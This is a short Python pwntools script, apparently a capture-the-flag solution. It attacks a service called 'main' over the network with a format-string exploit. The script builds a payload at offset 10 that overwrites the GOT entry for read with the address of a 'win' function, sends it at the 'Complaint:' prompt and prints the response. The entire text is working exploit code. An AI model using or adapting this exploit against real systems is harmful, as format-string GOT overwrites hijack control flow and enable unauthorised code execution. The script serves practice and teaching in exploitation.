from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1356))
payload = fmtstr_payload(10, {elf.got.read: p16(elf.sym.win & 0xffff)}, write_size="short")
p.sendlineafter(b"Complaint: ", payload)
print(p.recvall().decode())
